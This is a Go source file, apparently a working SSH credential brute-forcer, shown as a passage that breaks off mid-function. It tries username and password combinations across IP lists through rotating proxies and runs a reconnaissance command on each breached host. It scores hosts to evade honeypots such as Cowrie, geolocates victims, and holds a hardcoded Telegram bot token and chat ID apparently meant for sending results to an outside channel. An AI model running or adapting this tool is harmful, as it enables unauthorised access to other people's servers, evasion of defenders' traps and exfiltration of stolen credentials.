package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
var ipFile string
var timeout int
var maxConnections int

var (
	successfulIPs       = make(map[string]struct{})
	mapMutex            sync.Mutex
	concurrentPerWorker int
)

type ProxyInfo struct {
	Addr string
	User string
	Pass string
}

var (
	proxies     []ProxyInfo
	proxyIndex  uint64
	useProxy    bool
	proxyErrors int64
)

type IPInfo struct {
	IP      string `json:"ip"`
	City    string `json:"city"`
	Region  string `json:"region"`
	Country string `json:"country"`
	Org     string `json:"org"`
}

type SSHTask struct {
	IP       string
	Port     string
	Username string
	Password string
}

type ServerInfo struct {
	IP            string
	Port          string
	Username      string
	Password      string
	IsHoneypot    bool
	HoneypotScore int
	SSHVersion    string
	OSInfo        string
	Hostname      string
	ResponseTime  time.Duration
	Commands      map[string]string
	OpenPorts     []string
	CPUCores      int
	Architecture  string
	CPUModel      string
	MemoryKB      int
	DiskKB        int
	MaxDiskGB     int
	GPUInfo       string
	UserCount     int
	PackageCount  int
	IsContainer   bool
}

const (
	botToken = "8973833073:AAGstV_gHSEBQmo2ZiPZSguWlOcxFAPLeU4"
	chatID   = "6320839835"
)

func sendTelegramMessage(message string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	
	data := url.Values{}
	data.Set("chat_id", chatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")
	
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.PostForm(apiURL, data)
	if err != nil {
		log.Printf("Telegram send error: %v", err)
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("Telegram API error: %s", string(body))
	}
}

func main() {
	if len(os.Args) < 7 || len(os.Args) > 8 {
		log.Fatal("Usage: go run vps.go <user.txt> <pass.txt> <ip.txt> <delay> <low_thread> <max_thread> [proxy.txt]")
	}

	usernameFile := os.Args[1]
	passwordFile := os.Args[2]
	ipFile = os.Args[3]
	timeoutStr := os.Args[4]
	lowThreadStr := os.Args[5]
	maxConnectionsStr := os.Args[6]

	timeout, _ = strconv.Atoi(timeoutStr)
	concurrentPerWorker, _ = strconv.Atoi(lowThreadStr)
	maxConnections, _ = strconv.Atoi(maxConnectionsStr)

	if len(os.Args) == 8 {
		proxyFile := os.Args[7]
		proxyList := getItems(proxyFile)
		for _, p := range proxyList {
			line := strings.Join(p, ":")
			var pi ProxyInfo
			if atIdx := strings.Index(line, "@"); atIdx != -1 {
				pi.Addr = line[:atIdx]
				auth := line[atIdx+1:]
				if colonIdx := strings.Index(auth, ":"); colonIdx != -1 {
					pi.User = auth[:colonIdx]
					pi.Pass = auth[colonIdx+1:]
				}
			} else {
				if len(p) >= 2 {
					pi.Addr = p[0] + ":" + p[1]
				} else if len(p) == 1 && strings.Contains(p[0], ":") {
					pi.Addr = p[0]
				}
			}
			if pi.Addr != "" && strings.Contains(pi.Addr, ":") {
				proxies = append(proxies, pi)
			}
		}
		if len(proxies) > 0 {
			useProxy = true
			fmt.Printf("Loaded %d proxies from %s\n", len(proxies), proxyFile)
		} else {
			log.Fatal("No valid proxies loaded from " + proxyFile)
		}
	}

	createComboFile(usernameFile, passwordFile)
	fmt.Printf("IP file: %s, Timeout: %ds, Low Thread: %d, Max Thread: %d\n", ipFile, timeout, concurrentPerWorker, maxConnections)

	startTime = time.Now()

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	done := make(chan struct{})
	go banner(done)

	setupWorkerPool(combos, ips)
	
	close(done)
	
	fmt.Println("Operation completed successfully!")
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(usernameFile, passwordFile string) {
	usernames := getItems(usernameFile)
	passwords := getItems(passwordFile)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	megaCmd := `echo "===HOSTNAME==="; hostname 2>/dev/null || echo EMPTY;
echo "===UNAME==="; uname -a 2>/dev/null || echo EMPTY;
echo "===WHOAMI==="; whoami 2>/dev/null || echo EMPTY;
echo "===PWD==="; pwd 2>/dev/null || echo EMPTY;
echo "===LS_ROOT==="; ls -la / 2>/dev/null | head -10 || echo EMPTY;
echo "===PS==="; ps aux 2>/dev/null | head -15 || echo EMPTY;
echo "===NETSTAT==="; netstat -tulpn 2>/dev/null | head -10 || echo EMPTY;
echo "===HISTORY==="; history 2>/dev/null | tail -5 || echo EMPTY;
echo "===SSH_VERSION==="; ssh -V 2>&1 || echo EMPTY;
echo "===UPTIME==="; uptime 2>/dev/null || echo EMPTY;
echo "===MOUNT==="; mount 2>/dev/null | head -5 || echo EMPTY;
echo "===ENV==="; env 2>/dev/null | head -10 || echo EMPTY;
echo "===CPU_CORES==="; nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 0;
echo "===ARCH==="; uname -m 2>/dev/null || echo unknown;
echo "===CPU_MODEL==="; grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d ':' -f2- | sed 's/^ *//' || echo unknown;
echo "===RESOURCES==="; echo MEMKB=$(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null) DISKKB=$(df / 2>/dev/null | awk 'NR==2{print $2}') USERCNT=$(wc -l < /etc/passwd 2>/dev/null) PKGCNT=$(dpkg -l 2>/dev/null | grep -c '^ii' || rpm -qa 2>/dev/null | wc -l || echo 0);
echo "===CONTAINER==="; cat /proc/1/cgroup 2>/dev/null | head -3; test -f /.dockerenv && echo DOCKERENV; test -f /run/.containerenv && echo CONTAINERENV; echo;
echo "===COWRIE==="; ls /opt/cowrie /home/richard /etc/cowrie 2>&1;
echo "===DMESG==="; dmesg 2>/dev/null | head -5 || echo EMPTY;
echo "===PORTS==="; ss -tulpn 2>/dev/null | grep LISTEN | head -20 || netstat -tulpn 2>/dev/null | grep LISTEN | head -20 || echo EMPTY;
echo "===NETCFG==="; ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -3 || echo EMPTY;
echo "===IPADDR==="; ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5 || echo EMPTY;
echo "===IPROUTE==="; ip route show 2>/dev/null | head -3 || echo EMPTY;
echo "===WRITE==="; TF=/tmp/t_$$; echo test > $TF 2>&1 && echo WRITEOK && rm -f $TF || echo WRITEFAIL;
echo "===IDCHECK==="; id 2>/dev/null && echo IDOK || echo IDFAIL; whoami 2>/dev/null && echo WHOAMIOK || echo WHOAMIFAIL;
echo "===PKGMGR==="; which apt 2>/dev/null || which yum 2>/dev/null || which pacman 2>/dev/null || which zypper 2>/dev/null || echo NOPKG;
echo "===SERVICES==="; systemctl list-units --type=service --state=running 2>/dev/null | head -10 || echo NOSVC;
echo "===SOCKETS==="; ss -tuln 2>/dev/null | wc -l || echo 0;
echo "===GPU==="; nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null || echo NOGPU;
echo "===MAXDISK==="; df -BG 2>/dev/null | awk 'NR>1{gsub("G","",$2); if($2+0>max) max=$2+0} END{print max+0}' || echo 0;
echo "===END==="`

	output := executeCommand(client, megaCmd)
	sections := parseMegaOutput(output)

	serverInfo.Commands["hostname"] = sections["HOSTNAME"]
	serverInfo.Commands["uname"] = sections["UNAME"]
	serverInfo.Commands["whoami"] = sections["WHOAMI"]
	serverInfo.Commands["pwd"] = sections["PWD"]
	serverInfo.Commands["ls_root"] = sections["LS_ROOT"]
	serverInfo.Commands["ps"] = sections["PS"]
	serverInfo.Commands["netstat"] = sections["NETSTAT"]
	serverInfo.Commands["history"] = sections["HISTORY"]
	serverInfo.Commands["ssh_version"] = sections["SSH_VERSION"]
	serverInfo.Commands["uptime"] = sections["UPTIME"]
	serverInfo.Commands["mount"] = sections["MOUNT"]
	serverInfo.Commands["env"] = sections["ENV"]
	serverInfo.Commands["cpu_cores"] = sections["CPU_CORES"]
	serverInfo.Commands["arch"] = sections["ARCH"]
	serverInfo.Commands["cpu_model"] = sections["CPU_MODEL"]
	serverInfo.Commands["resources"] = sections["RESOURCES"]
	serverInfo.Commands["container_check"] = sections["CONTAINER"]
	serverInfo.Commands["cowrie_check"] = sections["COWRIE"]
	serverInfo.Commands["dmesg_check"] = sections["DMESG"]
	serverInfo.Commands["netcfg"] = sections["NETCFG"]
	serverInfo.Commands["ipaddr"] = sections["IPADDR"]
	serverInfo.Commands["iproute"] = sections["IPROUTE"]
	serverInfo.Commands["write_test"] = sections["WRITE"]
	serverInfo.Commands["id_check"] = sections["IDCHECK"]
	serverInfo.Commands["pkgmgr"] = sections["PKGMGR"]
	serverInfo.Commands["services"] = sections["SERVICES"]
	serverInfo.Commands["sockets"] = sections["SOCKETS"]
	serverInfo.Commands["gpu"] = sections["GPU"]
	serverInfo.Commands["maxdisk"] = sections["MAXDISK"]

	serverInfo.Hostname = strings.TrimSpace(sections["HOSTNAME"])
	serverInfo.OSInfo = strings.TrimSpace(sections["UNAME"])
	serverInfo.SSHVersion = strings.TrimSpace(sections["SSH_VERSION"])

	if coresStr := strings.TrimSpace(sections["CPU_CORES"]); coresStr != "" && coresStr != "EMPTY" {
		if n, err := strconv.Atoi(coresStr); err == nil {
			serverInfo.CPUCores = n
		}
	}
	serverInfo.Architecture = strings.TrimSpace(sections["ARCH"])
	serverInfo.CPUModel = strings.TrimSpace(sections["CPU_MODEL"])

	if resOut := sections["RESOURCES"]; resOut != "" {
		resMem := regexp.MustCompile(`MEMKB=(\d+)`)
		resDisk := regexp.MustCompile(`DISKKB=(\d+)`)
		resUser := regexp.MustCompile(`USERCNT=(\d+)`)
		resPkg := regexp.MustCompile(`PKGCNT=(\d+)`)
		if m := resMem.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.MemoryKB, _ = strconv.Atoi(m[1])
		}
		if m := resDisk.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.DiskKB, _ = strconv.Atoi(m[1])
		}
		if m := resUser.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.UserCount, _ = strconv.Atoi(m[1])
		}
		if m := resPkg.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.PackageCount, _ = strconv.Atoi(m[1])
		}
	}

	if gpuOut := strings.TrimSpace(sections["GPU"]); gpuOut != "" && gpuOut != "NOGPU" {
		serverInfo.GPUInfo = gpuOut
	}

	if maxDiskStr := strings.TrimSpace(sections["MAXDISK"]); maxDiskStr != "" && maxDiskStr != "0" {
		if n, err := strconv.Atoi(maxDiskStr); err == nil && n > 0 {
			serverInfo.MaxDiskGB = n
		}
	}

	if dockerOut := sections["CONTAINER"]; dockerOut != "" {
		lower := strings.ToLower(dockerOut)
		serverInfo.IsContainer = strings.Contains(lower, "docker") || strings.Contains(lower, "lxc") ||
			strings.Contains(lower, "containerenv") || strings.Contains(lower, "dockerenv") ||
			strings.Contains(lower, "kubepods")
	}

	portsOut := sections["PORTS"]
	if portsOut != "" && portsOut != "EMPTY" {
		portRegex := regexp.MustCompile(`:(\d+)\s`)
		for _, line := range strings.Split(portsOut, "\n") {
			matches := portRegex.FindAllStringSubmatch(line, -1)
			for _, match := range matches {
				if len(match) > 1 && !contains(serverInfo.OpenPorts, match[1]) {
					serverInfo.OpenPorts = append(serverInfo.OpenPorts, match[1])
				}
			}
		}
	}
}

func parseMegaOutput(output string) map[string]string {
	sections := make(map[string]string)
	markers := []string{"HOSTNAME", "UNAME", "WHOAMI", "PWD", "LS_ROOT", "PS", "NETSTAT",
		"HISTORY", "SSH_VERSION", "UPTIME", "MOUNT", "ENV", "CPU_CORES", "ARCH",
		"CPU_MODEL", "RESOURCES", "CONTAINER", "COWRIE", "DMESG", "PORTS",
		"NETCFG", "IPADDR", "IPROUTE", "WRITE", "IDCHECK", "PKGMGR", "SERVICES", "SOCKETS",
		"GPU", "MAXDISK", "END"}

	for i := 0; i < len(markers)-1; i++ {
		startTag := "===" + markers[i] + "==="
		endTag := "===" + markers[i+1] + "==="
		startIdx := strings.Index(output, startTag)
		endIdx := strings.Index(output, endTag)
		if startIdx >= 0 && endIdx > startIdx {
			content := output[startIdx+len(startTag) : endIdx]
			sections[markers[i]] = strings.TrimSpace(content)
		}
	}
	return sections
}

func executeCommand(client *ssh.Client, command string) string {
	out := execWithTimeout(client, command, false, 12*time.Second)
	if out == "" || strings.HasPrefix(out, "ERROR:") {
		retryOut := execWithTimeout(client, command, true, 25*time.Second)
		if retryOut != "" && !strings.HasPrefix(retryOut, "ERROR:") {
			return retryOut
		}
		if out == "" {
			return retryOut
		}
	}
	return out
}

func execWithTimeout(client *ssh.Client, command string, usePTY bool, timeout time.Duration) string {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	defer session.Close()

	if usePTY {
		modes := ssh.TerminalModes{
			ssh.ECHO:          0,
			ssh.TTY_OP_ISPEED: 14400,
			ssh.TTY_OP_OSPEED: 14400,
		}
		session.RequestPty("xterm", 200, 200, modes)
	}

	type result struct {
		out []byte
		err error
	}
	ch := make(chan result, 1)
	go func() {
		out, err := session.CombinedOutput(command)
		ch <- result{out, err}
	}()

	select {
	case r := <-ch:
		if r.err != nil && len(r.out) == 0 {
			return fmt.Sprintf("ERROR: %v", r.err)
		}
		cleaned := string(r.out)
		if usePTY {
			ansiRe := regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]|\r`)
			cleaned = ansiRe.ReplaceAllString(cleaned, "")
		}
		return cleaned
	case <-time.After(timeout):
		session.Close()
		return "ERROR: timeout"
	}
}

func formatDiskSize(gb int) string {
	if gb <= 0 {
		return "N/A"
	}
	if gb >= 1000 {
		return fmt.Sprintf("%.1f TB", float64(gb)/1000.0)
	}
	return fmt.Sprintf("%d GB", gb)
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func detectHoneypot(serverInfo *ServerInfo) bool {
	score := 0

	hostLower := strings.ToLower(serverInfo.Hostname)
	osLower := strings.ToLower(serverInfo.OSInfo)
	archLower := strings.ToLower(serverInfo.Architecture)
	cpuLower := strings.ToLower(serverInfo.CPUModel)
	sshLower := strings.ToLower(serverInfo.SSHVersion)

	if hostLower == "" || hostLower == "empty" || strings.Contains(hostLower, "error") {
		score += 3
	}

	if strings.Contains(hostLower, "honeypot") || strings.Contains(hostLower, "fake") ||
		strings.Contains(hostLower, "trap") || strings.Contains(hostLower, "sandbox") {
		score += 5
	}

	if strings.Contains(osLower, "preempt_dynamic") {
		score += 2
	}

	if strings.Contains(osLower, " #0 ") {
		score += 2
	}

	if serverInfo.IsContainer {
		score += 2
	}

	if archLower == "i686" && serverInfo.CPUCores > 2 {
		score += 3
	}

	if (archLower == "armv7l" || archLower == "aarch64" || strings.HasPrefix(archLower, "mips")) &&
		(strings.Contains(cpuLower, "intel") || strings.Contains(cpuLower, "amd") ||
			strings.Contains(cpuLower, "xeon") || strings.Contains(cpuLower, "epyc")) {
		score += 4
	}

	if cpuLower == "" || cpuLower == "unknown" || cpuLower == "empty" {
		if serverInfo.CPUCores > 2 {
			score += 3
		}
	}

	if strings.Contains(serverInfo.SSHVersion, "usage: ssh") {
		score += 1
	}

	if strings.TrimSpace(serverInfo.SSHVersion) == "" || strings.TrimSpace(serverInfo.SSHVersion) == "EMPTY" {
		score += 3
		if serverInfo.CPUCores >= 4 {
			score += 2
		}
	}

	if strings.Contains(sshLower, "paramiko") || strings.Contains(sshLower, "twisted") ||
		strings.Contains(sshLower, "libssh-0.6") {
		score += 4
	}

	for _, p := range serverInfo.OpenPorts {
		if p == "2222" {
			score += 3
			break
		}
	}

	if len(serverInfo.OpenPorts) == 0 {
		if portsOut, ok := serverInfo.Commands["netstat"]; ok && len(strings.TrimSpace(portsOut)) > 5 {
			score += 2
		}
	}

	if cowrieOut, ok := serverInfo.Commands["cowrie_check"]; ok {
		lower := strings.ToLower(cowrieOut)
		if strings.Contains(lower, "/opt/cowrie") && !strings.Contains(lower, "no such file") {
			score += 5
		}
		if strings.Contains(lower, "/home/richard") && !strings.Contains(lower, "no such file") {
			score += 4
		}
		if strings.Contains(lower, "/etc/cowrie") && !strings.Contains(lower, "no such file") {
			score += 5
		}
	}

	if psOut, ok := serverInfo.Commands["ps"]; ok {
		psLower := strings.ToLower(psOut)
		for _, proc := range []string{"twistd", "cowrie", "kippo", "opencanary", "hfish", "dionaea", "tanner"} {
			if strings.Contains(psLower, proc) {
				score += 4
				break
			}
		}
	}

	if envOut, ok := serverInfo.Commands["env"]; ok {
		envLower := strings.ToLower(envOut)
		for _, indicator := range []string{"cowrie", "honeypot", "kippo", "hfish", "opencanary"} {
			if strings.Contains(envLower, indicator) {
				score += 3
				break
			}
		}
	}

	if serverInfo.MemoryKB > 0 && serverInfo.MemoryKB < 131072 {
		score += 3
	}

	if serverInfo.DiskKB > 0 && serverInfo.DiskKB < 1048576 {
		score += 2
	}

	if serverInfo.UserCount > 0 && serverInfo.UserCount < 3 {
		score += 2
	}

	if serverInfo.PackageCount >= 0 && serverInfo.PackageCount < 20 {
		score += 2
	}

	if dmesgOut, ok := serverInfo.Commands["dmesg_check"]; ok {
		lower := strings.ToLower(dmesgOut)
		if (strings.Contains(lower, "noaccess") || strings.Contains(lower, "error") ||
			strings.Contains(lower, "operation not permitted")) && !serverInfo.IsContainer {
			score += 1
		}
	}

	if serverInfo.MemoryKB > 1048576 {
		score -= 1
	}
	if serverInfo.DiskKB > 10485760 {
		score -= 1
	}
	if serverInfo.UserCount > 15 {
		score -= 1
	}
	if serverInfo.CPUCores > 1 {
		score -= 1
	}
	if serverInfo.PackageCount > 200 {
		score -= 1
	}
	if score < 0 {
		score = 0
	}

	serverInfo.HoneypotScore = score
	return score >= 6
}

func getIPInfo(ip string) IPInfo {
	var info IPInfo
	client := &http.Client{Timeout: 5 * time.Second}

	if resp, err := client.Get("https://ipinfo.io/" + ip + "/json"); err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		json.Unmarshal(body, &info)
		if info.Country != "" {
			return info
		}
	}

	if resp, err := client.Get("http://ip-api.com/json/" + ip); err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var raw map[string]interface{}
		json.Unmarshal(body, &raw)
		info.Country = getStrVal(raw, "countryCode")
		info.Region = getStrVal(raw, "regionName")
		info.City = getStrVal(raw, "city")
		info.Org = getStrVal(raw, "isp")
		if info.Country != "" {
			return info
		}
	}

	if resp, err := client.Get("https://ipwhois.app/json/" + ip); err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var raw map[string]interface{}
		json.Unmarshal(body, &raw)
		info.Country = getStrVal(raw, "country_code")
		info.Region = getStrVal(raw, "region")
		info.City = getStrVal(raw, "city")
		info.Org = getStrVal(raw, "isp")
	}

	return info
}

func getStrVal(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func banner(done <-chan struct{}) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			g, e, h := atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.errors), atomic.LoadInt64(&stats.honeypots)
			total := int(g + e + h)
			elapsed := time.Since(startTime).Seconds()
			speed := float64(total) / elapsed
			remain := float64(totalIPCount-total) / speed

			clear()
			fmt.Printf("File: %s | Timeout: %ds\n", ipFile, timeout)
			fmt.Printf("Workers: %d | Per: %d\n", maxConnections, concurrentPerWorker)
			if useProxy {
				pe := atomic.LoadInt64(&proxyErrors)
				fmt.Printf("Proxies: %d (round-robin) | Proxy errors: %d\n", len(proxies), pe)
			} else {
				fmt.Printf("Proxy: none (direct)\n")
			}
			fmt.Printf("Checked: %d/%d | Speed: %.2f/s\n", total, totalIPCount, speed)
			if total < totalIPCount {
				fmt.Printf("Elapsed: %s | Remain: %s\n", formatTime(int(elapsed)), formatTime(int(remain)))
			} else {
				fmt.Printf("Total: %s\n", formatTime(int(elapsed)))
			}
			fmt.Printf("Good: %d | Fail: %d | Honey: %d\n", g, e, h)
			if total >= totalIPCount {
				return
			}
		}
	}
}

func formatTime(sec int) string {
	d := sec / 86400
	h := (sec % 86400) / 3600
	m := (sec % 3600) / 60
	s := sec % 60
	return fmt.Sprintf("%02d:%02d:%02d:%02d", d, h, m, s)
}

func appendToFile(data, path string) {
	f, _ := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	f.WriteString(data)
}

func calculateOptimalBuffers() int {
	return int(float64(maxConnections*concurrentPerWorker) * 1.5)
}

func setupWorkerPool(combos, ips [][]string) {
	buf := calculateOptimalBuffers()
	taskQ := make(chan SSHTask, buf)
	var wg sync.WaitGroup

	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go mainWorker(i, taskQ, &wg)
	}

	go banner(nil)

	go func() {
		for _, c := range combos {
			for _, ip := range ips {
				taskQ <- SSHTask{IP: ip[0], Port: ip[1], Username: c[0], Password: c[1]}
			}
		}
		close(taskQ)
	}()

	wg.Wait()
}

func mainWorker(id int, q <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	sem := make(chan struct{}, concurrentPerWorker)
	var inner sync.WaitGroup
	for t := range q {
		inner.Add(1)
		sem <- struct{}{}
		go func(task SSHTask) {
			defer inner.Done()
			defer func() { <-sem }()
			processSSHTask(task)
		}(t)
	}
	inner.Wait()
}

func isValidShellResponse(info *ServerInfo) bool {
	lowerHost := strings.ToLower(info.Hostname)

	if len(info.Hostname) > 100 {
		return false
	}
	if strings.Count(strings.TrimSpace(info.Hostname), "\n") > 0 {
		return false
	}
	for _, p := range []string{"copyright", "warranty", "last login:"} {
		if strings.Contains(lowerHost, p) {
			return false
		}
	}
	return true
}

func getNextProxy() ProxyInfo {
	idx := atomic.AddUint64(&proxyIndex, 1)
	return proxies[idx%uint64(len(proxies))]
}

func httpConnectDial(proxy ProxyInfo, target string, timeout time.Duration) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxy.Addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("http proxy dial: %w", err)
	}
	conn.SetDeadline(time.Now().Add(timeout))

	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
	if proxy.User != "" {
		auth := base64.StdEncoding.EncodeToString([]byte(proxy.User + ":" + proxy.Pass))
		connectReq += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", auth)
	}
	connectReq += "\r\n"

	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("http connect write: %w", err)
	}

	reader := bufio.NewReader(conn)
	statusLine, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("http connect read: %w", err)
	}

	if !strings.Contains(statusLine, "200") {
		conn.Close()
		return nil, fmt.Errorf("http connect failed: %s", strings.TrimSpace(statusLine))
	}

	for {
		line, err := reader.ReadString('\n')
		if err != nil || strings.TrimSpace(line) == "" {
			break
		}
	}

	conn.SetDeadline(time.Time{})
	return conn, nil
}

func socks5Dial(proxy ProxyInfo, target string, timeout time.Duration) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxy.Addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("proxy dial: %w", err)
	}
	conn.SetDeadline(time.Now().Add(timeout))

	if proxy.User != "" {
		_, err = conn.Write([]byte{0x05, 0x02, 0x00, 0x02})
	} else {
		_, err = conn.Write([]byte{0x05, 0x01, 0x00})
	}
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("proxy greeting write: %w", err)
	}

	greeting := make([]byte, 2)
	_, err = io.ReadFull(conn, greeting)
	if err != nil || greeting[0] != 0x05 {
		conn.Close()
		return nil, fmt.Errorf("proxy greeting failed")
	}

	if greeting[1] == 0x02 && proxy.User != "" {
		authReq := []byte{0x01, byte(len(proxy.User))}
		authReq = append(authReq, []byte(proxy.User)...)
		authReq = append(authReq, byte(len(proxy.Pass)))
		authReq = append(authReq, []byte(proxy.Pass)...)
		_, err = conn.Write(authReq)
		if err != nil {
			conn.Close()
			return nil, fmt.Errorf("proxy auth write: %w", err)
		}
		authResp := make([]byte, 2)
		_, err = io.ReadFull(conn, authResp)
		if err != nil || authResp[1] != 0x00 {
			conn.Close()
			return nil, fmt.Errorf("proxy auth failed")
		}
	} else if greeting[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("proxy requires unsupported auth method %d", greeting[1])
	}

	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("invalid target: %w", err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("invalid port: %w", err)
	}

	req := []byte{0x05, 0x01, 0x00, 0x03, byte(len(host))}
	req = append(req, []byte(host)...)
	req = append(req, byte(port>>8), byte(port))
	_, err = conn.Write(req)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("proxy connect write: %w", err)
	}

	resp := make([]byte, 4)
	_, err = io.ReadFull(conn, resp)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("proxy connect response: %w", err)
	}
	if resp[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("proxy connect failed: status %d", resp[1])
	}

	switch resp[3] {
	case 0x01:
		skip := make([]byte, 4+2)
		io.ReadFull(conn, skip)
	case 0x03:
		dl := make([]byte, 1)
		io.ReadFull(conn, dl)
		skip := make([]byte, int(dl[0])+2)
		io.ReadFull(conn, skip)
	case 0x04:
		skip := make([]byte, 16+2)
		io.ReadFull(conn, skip)
	}

	conn.SetDeadline(time.Time{})
	return conn, nil
}

func dialWithProxy(target string, timeoutSec int) (net.Conn, error, string) {
	timeout := time.Duration(timeoutSec) * time.Second
	if !useProxy {
		dialer := &net.Dialer{
			Timeout:   timeout,
			KeepAlive: 15 * time.Second,
		}
		conn, err := dialer.Dial("tcp", target)
		return conn, err, "direct"
	}

	var lastErr error
	for attempt := 0; attempt < 3; attempt++ {
		proxy := getNextProxy()
		conn, err := httpConnectDial(proxy, target, timeout)
		if err == nil {
			return conn, nil, "http:" + proxy.Addr
		}
		conn, err = socks5Dial(proxy, target, timeout)
		if err == nil {
			return conn, nil, "socks5:" + proxy.Addr
		}
		lastErr = err
		atomic.AddInt64(&proxyErrors, 1)
	}
	return nil, lastErr, ""
}

func processSSHTask(t SSHTask) {
	cfg := &ssh.ClientConfig{
		User:            t.Username,
		Auth:            []ssh.AuthMethod{ssh.Password(t.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
		Config: ssh.Config{
			KeyExchanges: []string{
				"curve25519-sha256", "curve25519-sha256@libssh.org",
				"ecdh-sha2-nistp256", "diffie-hellman-group14-sha256",
			},
			Ciphers: []string{
				"aes128-gcm@openssh.com", "chacha20-poly1305@openssh.com",
				"aes128-ctr", "aes256-ctr",
			},
		},
	}

	start := time.Now()
	target := t.IP + ":" + t.Port
	conn, err, _ := dialWithProxy(target, timeout)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	conn.SetDeadline(time.Now().Add(45 * time.Second))

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, target, cfg)
	if err != nil {
		conn.Close()
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	client := ssh.NewClient(sshConn, chans, reqs)
	defer func() {
		client.Close()
		conn.Close()
	}()

	info := &ServerInfo{
		IP:           t.IP,
		Port:         t.Port,
		Username:     t.Username,
		Password:     t.Password,
		ResponseTime: time.Since(start),
		Commands:     make(map[string]string),
	}

	gatherSystemInfo(client, info)

	if !isValidShellResponse(info) {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	allEmpty := true
	for _, v := range info.Commands {
		if v != "" && v != "EMPTY" {
			allEmpty = false
			break
		}
	}
	if allEmpty || len(info.Commands) == 0 {
		info.IsHoneypot = true
		info.HoneypotScore = 10
		info.Hostname = "CONNECTION_CLOSED"
	} else {
		info.IsHoneypot = detectHoneypot(info)
	}

	if info.HoneypotScore == 11 {
		info.IsHoneypot = false
	}

	key := t.IP + ":" + t.Port
	mapMutex.Lock()
	if _, ok := successfulIPs[key]; ok {
		mapMutex.Unlock()
		return
	}
	successfulIPs[key] = struct{}{}
	mapMutex.Unlock()

	ipinfo := getIPInfo(info.IP)

	if ipinfo.Country == "" && ipinfo.Region == "" && ipinfo.City == "" && ipinfo.Org == "" {
		info.HoneypotScore += 3
		if info.HoneypotScore >= 6 {
			info.IsHoneypot = true
		}
	}

	if !info.IsHoneypot {
		orgLower := strings.ToLower(ipinfo.Org)
		for _, hpOrg := range []string{
